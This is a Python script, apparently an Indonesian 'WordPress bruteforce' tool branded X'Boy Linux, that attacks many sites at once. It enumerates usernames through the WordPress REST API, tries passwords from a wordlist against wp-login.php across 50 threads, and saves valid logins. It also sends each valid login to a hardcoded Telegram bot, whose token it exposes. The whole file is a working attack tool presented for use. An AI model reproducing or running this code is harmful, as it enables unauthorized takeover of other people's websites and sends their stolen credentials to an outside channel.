import requests, threading, sys, os, random
import time, sys, itertools
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor
# Fungsi untuk kirim pesan ke Telegram
def kirim_telegram(pesan):
    token = "8494882307:AAGATJsOGaDyWWGSSUEhCEgfU6vfNwnWDxI"
    chat_id = "7847996737"
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": pesan,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"[!] Gagal kirim ke Telegram: {e}")

init(autoreset=True)

def loading_spinner(text="Loading", duration=3):
    spinner = itertools.cycle(['⣾','⣽','⣻','⢿','⡿','⣟','⣯','⣷'])
    end_time = time.time() + duration
    while time.time() < end_time:
        sys.stdout.write(f"\r{Fore.CYAN}{text} {next(spinner)}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r' + ' ' * (len(text)+5) + '\r')

def snow_effect(lines, snowflakes=100):
    width = max(len(line) for line in lines)
    for _ in range(30):
        os.system('clear')
        flakes = [' '] * width
        for _ in range(snowflakes):
            pos = random.randint(0, width - 1)
            flakes[pos] = '*'
        print(Fore.LIGHTWHITE_EX + ''.join(flakes))
        for line in lines:
            print(line)
        time.sleep(0.05)

from colorama import Fore, Style

ascii_art = [
    Fore.LIGHTRED_EX + Style.BRIGHT + r"""
  ██████  ▄████▄   ▄▄▄       ███▄    █  ███▄    █ ▓█████  ██▀███
▒██    ▒ ▒██▀ ▀█  ▒████▄     ██ ▀█   █  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▓██  ▀█ ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
  ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄
▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒▒██░   ▓██░▒██░   ▓██░░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░  ░  ▒     ▒   ▒▒ ░░ ░░   ░ ▒░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░  ░          ░   ▒      ░   ░ ░    ░   ░ ░    ░     ░░   ░
      ░  ░ ░            ░  ░         ░          ░    ░  ░   ░
         ░                                                        """,
    Fore.LIGHTBLACK_EX + r"                             ░▒▓█  X'Boy Linux █▓▒░",
]

footer = (
    Fore.CYAN + Style.BRIGHT + "\n     𝚠𝚘𝚛𝚍𝚙𝚛𝚎𝚜𝚜 𝚋𝚛𝚞𝚝𝚎𝚏𝚘𝚛𝚌𝚎 " +
    Fore.LIGHTMAGENTA_EX + "by X'Boy Linux\n" +

    Fore.YELLOW + "     telegram: " + Fore.GREEN + "ON".ljust(30) +
    Fore.RESET + "team: " + Fore.LIGHTBLUE_EX + "foursdeath team\n" +

    Fore.YELLOW + "     versi: " + Fore.LIGHTGREEN_EX + "premium".ljust(30) +
    Fore.RESET + "WhatsApp: " + Fore.LIGHTRED_EX + "maintenance\n" +

    Fore.YELLOW + "     status: " + Fore.WHITE + "ready".ljust(30) +
    Fore.RESET + "threads: " + Fore.LIGHTCYAN_EX + "50\n" +

    Fore.YELLOW + "     mode: " + Fore.LIGHTMAGENTA_EX + "aggressive".ljust(30) +
    Fore.RESET + "bypass: " + Fore.GREEN + "enabled\n" +

    Fore.YELLOW + "     proxy: " + Fore.LIGHTWHITE_EX + "none".ljust(30) +
    Fore.RESET + "result: " + Fore.LIGHTYELLOW_EX + "valid.txt"
)
# Tampilkan efek loading
loading_spinner("Memulai X'Boy Linux Engine", 1)

# Efek ASCII salju
snow_effect(ascii_art)

# Footer bold
print("\n" + footer + "\n")


site_file = input(f"{Fore.CYAN}𝐋𝐢𝐬𝐭 𝐓𝐚𝐫𝐠𝐞𝐭: (e.g., site.txt): {Style.RESET_ALL}").strip()
pass_file = input(f"{Fore.CYAN}[?] 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱 𝗹𝗶𝘀𝘁 (e.g., pass.txt): {Style.RESET_ALL}").strip()

try:
    sites = open(site_file).read().splitlines()
    passwords = open(pass_file).read().splitlines()
except:
    print(Fore.RED + "[!] File tidak ditemukan!" + Style.RESET_ALL)
    sys.exit()

lock = threading.Lock()
found = []
user_map = {}
def get_wp_usernames(site):
    try:
        api = urljoin(site, "/wp-json/wp/v2/users")
        res = requests.get(api, timeout=5)
        if res.status_code == 200:
            data = res.json()
            return [user.get("slug") for user in data if "slug" in user]
    except:
        pass
    return ["admin"]  # fallback

def brute(site):
    if site not in user_map or not user_map[site]:
        print(f"{Fore.YELLOW}[~] Mendeteksi username dari: {site}{Style.RESET_ALL}")
        usernames = get_wp_usernames(site)
        if usernames:
            user_map[site] = usernames
            print(f"{Fore.YELLOW}[✓] Username ditemukan: {', '.join(usernames)}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[-] Gagal deteksi username. Gunakan default: admin{Style.RESET_ALL}")
            user_map[site] = ['admin']  # fallback

    login_url = urljoin(site, "/wp-login.php")

    try:
        r = requests.get(login_url, timeout=10)
        if "user_login" not in r.text or "wp-submit" not in r.text:
            print(Fore.YELLOW + f"[!] Skipped (Not WordPress): {site}" + Style.RESET_ALL)
            return
    except:
        print(Fore.RED + f"[!] Error: {site}" + Style.RESET_ALL)
        return

    for user in user_map[site]:
        for pwd in passwords:
            try:
                sess = requests.Session()
                data = {
                    "log": user,
                    "pwd": pwd,
                    "wp-submit": "Log In",
                    "redirect_to": urljoin(site, "/wp-admin/"),
                    "testcookie": "1"
                }
                headers = {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
                }
                sess.get(login_url, headers=headers)
                res = sess.post(login_url, data=data, headers=headers, timeout=10, allow_redirects=True)

                if "wp-admin/profile.php" in res.url or "dashboard" in res.text.lower():
                    with lock:
                        print(Fore.GREEN + f"[✓] Found: {site} :: {user}:{pwd}" + Style.RESET_ALL)
                        with open("valid.txt", "a") as f:
                            f.write(f"{site} :: {user}:{pwd}\n")
                        pesan = (
                                 f"🔥 *Login Berhasil!*\n"
                                 f"🔗 {site}\n"
                                 f"👤 Username: `{user}`\n"
                                 f"🔑 Password: `{pwd}`"
                        )
                        kirim_telegram(pesan)  # Kirim ke Telegram langsung saat success
                        found.append(site)
                        found.append(site)
                    return
                else:
                    print(Fore.LIGHTBLACK_EX + f"[-] Failed: {site} :: {pwd}" + Style.RESET_ALL)
            except:
                print(Fore.RED + f"[!] Error on: {site}" + Style.RESET_ALL)

with ThreadPoolExecutor(max_workers=50) as exec:
    exec.map(brute, sites)

print(f"\n{Fore.MAGENTA}[✓] Done. Cek valid.txt untuk hasil login berhasil.{Style.RESET_ALL}")
